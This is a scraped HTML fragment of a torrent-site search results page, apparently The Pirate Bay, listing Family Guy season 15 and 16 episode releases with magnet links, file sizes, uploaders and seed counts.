+<a href="magnet:?xt=urn:btih:9eec96759b64a5e3deca1092b80625fd42188d0f&dn=Family.Guy.S16E04.720p.HDTV.x264-AVS&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=nuyWdZtkpePeyhCSuAYl/UIYjQ8=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E04.720p.HDTV.x264-AVS" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 10-23&nbsp;2017, Size 393.84&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">141</td>
+		<td align="right">11</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/19329770/Family.Guy.S16E09.1080p.WEB.x264-TBS" class="detLink" title="Details for Family.Guy.S16E09.1080p.WEB.x264-TBS">Family.Guy.S16E09.1080p.WEB.x264-TBS</a>
+</div>
+<a href="magnet:?xt=urn:btih:0d01834e714764f3963529c237db3899ffc1812e&dn=Family.Guy.S16E09.1080p.WEB.x264-TBS&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=DQGDTnFHZPOWNSnCN9s4mf/BgS4=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E09.1080p.WEB.x264-TBS" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 12-11&nbsp;2017, Size 604.42&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">133</td>
+		<td align="right">16</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/19269222/Family.Guy.S16E08.HDTV.x264-SVA" class="detLink" title="Details for Family.Guy.S16E08.HDTV.x264-SVA">Family.Guy.S16E08.HDTV.x264-SVA</a>
+</div>
+<a href="magnet:?xt=urn:btih:3d5e12ccfe9bcbb7c43e4d46c3e06677bd0daaba&dn=Family.Guy.S16E08.HDTV.x264-SVA&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=PV4SzP6by7fEPk1Gw+Bmd70Nqro=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E08.HDTV.x264-SVA" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 12-04&nbsp;2017, Size 76.48&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">131</td>
+		<td align="right">4</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/19021751/Family.Guy.S16E06.HDTV.x264-SVA" class="detLink" title="Details for Family.Guy.S16E06.HDTV.x264-SVA">Family.Guy.S16E06.HDTV.x264-SVA</a>
+</div>
+<a href="magnet:?xt=urn:btih:1f3b8699f12a8bb3d136e9f3caac4712e0b2a9a6&dn=Family.Guy.S16E06.HDTV.x264-SVA&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=HzuGmfEqi7PRNunzyqxHEuCyqaY=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E06.HDTV.x264-SVA" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 11-13&nbsp;2017, Size 103.02&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">122</td>
+		<td align="right">6</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/19270216/Family.Guy.S16E08.PROPER.HDTV.x264-BATV" class="detLink" title="Details for Family.Guy.S16E08.PROPER.HDTV.x264-BATV">Family.Guy.S16E08.PROPER.HDTV.x264-BATV</a>
+</div>
+<a href="magnet:?xt=urn:btih:57128967d3f239a789779bf5766252a4dcca8492&dn=Family.Guy.S16E08.PROPER.HDTV.x264-BATV&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=VxKJZ9PyOaeJd5v1dmJSpNzKhJI=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E08.PROPER.HDTV.x264-BATV" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 12-04&nbsp;2017, Size 82.21&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">117</td>
+		<td align="right">3</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/18709223/Family.Guy.S16E02.HDTV.x264-SVA" class="detLink" title="Details for Family.Guy.S16E02.HDTV.x264-SVA">Family.Guy.S16E02.HDTV.x264-SVA</a>
+</div>
+<a href="magnet:?xt=urn:btih:a6caf088ec45aeebc1f560796f7373eeb0d16f25&dn=Family.Guy.S16E02.HDTV.x264-SVA&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=psrwiOxFruvB9WB5b3Nz7rDRbyU=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E02.HDTV.x264-SVA" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 10-09&nbsp;2017, Size 106.9&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">104</td>
+		<td align="right">26</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/19269224/Family.Guy.S16E08.720p.HDTV.x264-AVS" class="detLink" title="Details for Family.Guy.S16E08.720p.HDTV.x264-AVS">Family.Guy.S16E08.720p.HDTV.x264-AVS</a>
+</div>
+<a href="magnet:?xt=urn:btih:86c5d8c0e1675bd280f0cd86d181eaec2f0cd5c4&dn=Family.Guy.S16E08.720p.HDTV.x264-AVS&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=hsXYwOFnW9KA8M2G0YHq7C8M1cQ=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E08.720p.HDTV.x264-AVS" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 12-04&nbsp;2017, Size 327.93&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">98</td>
+		<td align="right">4</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/18969358/Family.Guy.S16E05.WEB.x264-TBS" class="detLink" title="Details for Family.Guy.S16E05.WEB.x264-TBS">Family.Guy.S16E05.WEB.x264-TBS</a>
+</div>
+<a href="magnet:?xt=urn:btih:ee36aae8ad224e99d30805d803ec2266d2b1b61f&dn=Family.Guy.S16E05.WEB.x264-TBS&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=7jaq6K0iTpnTCAXYA+wiZtKxth8=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E05.WEB.x264-TBS" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 11-06&nbsp;2017, Size 165.6&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">84</td>
+		<td align="right">6</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/18745419/Family.Guy.S16E03.720p.HDTV.x264-AVS" class="detLink" title="Details for Family.Guy.S16E03.720p.HDTV.x264-AVS">Family.Guy.S16E03.720p.HDTV.x264-AVS</a>
+</div>
+<a href="magnet:?xt=urn:btih:8b5dc2cb04b03890c376f6bbcab90f857be2a4a9&dn=Family.Guy.S16E03.720p.HDTV.x264-AVS&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=i13CywSwOJDDdva7yrkPhXvipKk=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E03.720p.HDTV.x264-AVS" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 10-16&nbsp;2017, Size 404.69&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">80</td>
+		<td align="right">4</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/19270460/Family.Guy.S16E08.PROPER.720p.HDTV.x264-BATV" class="detLink" title="Details for Family.Guy.S16E08.PROPER.720p.HDTV.x264-BATV">Family.Guy.S16E08.PROPER.720p.HDTV.x264-BATV</a>
+</div>
+<a href="magnet:?xt=urn:btih:3fc68c7e766abd2c7831bf3ae27e9d36fc3cb5e7&dn=Family.Guy.S16E08.PROPER.720p.HDTV.x264-BATV&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=P8aMfnZqvSx4Mb864n6dNvw8tec=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E08.PROPER.720p.HDTV.x264-BATV" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><img src="//thepiratebay.org/static/img/icon_comment.gif" alt="This torrent has 1 comments." title="This torrent has 1 comments." /><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a>
+			<font class="detDesc">Uploaded 12-04&nbsp;2017, Size 345.44&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">80</td>
+		<td align="right">5</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/15942521/Family.Guy.S15E02.PROPER.HDTV.x264-KILLERS[ettv]" class="detLink" title="Details for Family.Guy.S15E02.PROPER.HDTV.x264-KILLERS[ettv]">Family.Guy.S15E02.PROPER.HDTV.x264-KILLERS[ettv]</a>
+</div>
+<a href="magnet:?xt=urn:btih:21ad5142e6dc683009561b16254e4ebaae0edb37&dn=Family.Guy.S15E02.PROPER.HDTV.x264-KILLERS%5Bettv%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=Ia1RQubcaDAJVhsWJU5Ouq4O2zc=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S15E02.PROPER.HDTV.x264-KILLERS[ettv]" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><img src="//thepiratebay.org/static/img/icon_comment.gif" alt="This torrent has 3 comments." title="This torrent has 3 comments." /><a href="/user/ettv"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a>
+			<font class="detDesc">Uploaded 10-03&nbsp;2016, Size 94.01&nbsp;MiB, ULed by <a class="detDesc" href="/user/ettv/" title="Browse ettv">ettv</a></font>
+		</td>
+		<td align="right">67</td>
+		<td align="right">4</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/19269251/Family.Guy.S16E08.REPACK.HDTV.x264-SVA[ettv]" class="detLink" title="Details for Family.Guy.S16E08.REPACK.HDTV.x264-SVA[ettv]">Family.Guy.S16E08.REPACK.HDTV.x264-SVA[ettv]</a>
+</div>
+<a href="magnet:?xt=urn:btih:7fa20964a3a8ebc5fc392d3353e124c39ff9c539&dn=Family.Guy.S16E08.REPACK.HDTV.x264-SVA%5Bettv%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=f6IJZKOo68X8OS0zU+Ekw5/5xTk=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E08.REPACK.HDTV.x264-SVA[ettv]" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/ettv"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 12-04&nbsp;2017, Size 84.95&nbsp;MiB, ULed by <a class="detDesc" href="/user/ettv/" title="Browse ettv">ettv</a></font>
+		</td>
+		<td align="right">63</td>
+		<td align="right">4</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/19329701/Family.Guy.S16E09.WEB.x264-TBS[ettv]" class="detLink" title="Details for Family.Guy.S16E09.WEB.x264-TBS[ettv]">Family.Guy.S16E09.WEB.x264-TBS[ettv]</a>
+</div>
+<a href="magnet:?xt=urn:btih:13acd913e3c393723f62d47b0b1f831e61ea196e&dn=Family.Guy.S16E09.WEB.x264-TBS%5Bettv%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=E6zZE+PDk3I/YtR7Cx+DHmHqGW4=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E09.WEB.x264-TBS[ettv]" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/ettv"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 12-11&nbsp;2017, Size 158.74&nbsp;MiB, ULed by <a class="detDesc" href="/user/ettv/" title="Browse ettv">ettv</a></font>
+		</td>
+		<td align="right">62</td>
+		<td align="right">4</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/18675697/Family.Guy.S16E01.720p.HDTV.x264-AVS" class="detLink" title="Details for Family.Guy.S16E01.720p.HDTV.x264-AVS">Family.Guy.S16E01.720p.HDTV.x264-AVS</a>
+</div>
+<a href="magnet:?xt=urn:btih:a73d95db44bf8db2b30415ffb9f5aecc1dce122b&dn=Family.Guy.S16E01.720p.HDTV.x264-AVS&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=pz2V20S/jbKzBBX/ufWuzB3OEis=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E01.720p.HDTV.x264-AVS" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 10-02&nbsp;2017, Size 355.98&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">60</td>
+		<td align="right">5</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/15897162/Family.Guy.S15E01.HDTV.x264-LOL[ettv]" class="detLink" title="Details for Family.Guy.S15E01.HDTV.x264-LOL[ettv]">Family.Guy.S15E01.HDTV.x264-LOL[ettv]</a>
+</div>
+<a href="magnet:?xt=urn:btih:b1628cee9bd383088d48a0f6c914a15385078325&dn=Family.Guy.S15E01.HDTV.x264-LOL%5Bettv%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=sWKM7pvTgwiNSKD2yRShU4UHgyU=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S15E01.HDTV.x264-LOL[ettv]" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><img src="//thepiratebay.org/static/img/icon_comment.gif" alt="This torrent has 5 comments." title="This torrent has 5 comments." /><a href="/user/ettv"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a>
+			<font class="detDesc">Uploaded 09-27&nbsp;2016, Size 68.51&nbsp;MiB, ULed by <a class="detDesc" href="/user/ettv/" title="Browse ettv">ettv</a></font>
+		</td>
+		<td align="right">56</td>
+		<td align="right">3</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/16055511/Family.Guy.S15E03.HDTV.x264-FLEET" class="detLink" title="Details for Family.Guy.S15E03.HDTV.x264-FLEET">Family.Guy.S15E03.HDTV.x264-FLEET</a>
+</div>
+<a href="magnet:?xt=urn:btih:86425f3f18d08fe6a52cb558aa10b1b66c4d98b9&dn=Family.Guy.S15E03.HDTV.x264-FLEET&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=hkJfPxjQj+alLLVYqhCxtmxNmLk=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S15E03.HDTV.x264-FLEET" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><img src="//thepiratebay.org/static/img/icon_comment.gif" alt="This torrent has 2 comments." title="This torrent has 2 comments." /><a href="/user/TvTeam"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a>
+			<font class="detDesc">Uploaded 10-17&nbsp;2016, Size 82.51&nbsp;MiB, ULed by <a class="detDesc" href="/user/TvTeam/" title="Browse TvTeam">TvTeam</a></font>
+		</td>
+		<td align="right">55</td>
+		<td align="right">3</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/16801312/Family.Guy.S15E11.HDTV.x264-KILLERS[ettv]" class="detLink" title="Details for Family.Guy.S15E11.HDTV.x264-KILLERS[ettv]">Family.Guy.S15E11.HDTV.x264-KILLERS[ettv]</a>
+</div>
